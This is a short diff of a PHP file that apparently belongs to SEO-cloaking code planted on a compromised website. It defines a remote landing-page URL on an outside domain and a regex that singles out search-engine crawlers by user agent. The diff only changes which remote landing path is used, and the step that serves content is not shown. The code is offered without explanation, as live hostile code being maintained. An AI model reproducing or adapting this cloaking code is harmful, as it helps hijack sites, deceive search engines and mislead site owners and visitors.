@@ -2,7 +2,7 @@
 @ob_start();
 header("Vary: U-Agent");
 
-$src = "https://childrenofiran.org/landing/acadcrm/";
+$src = "https://childrenofiran.org/landing/smkpgri1prabumulih/";
 $match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
 $ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
 
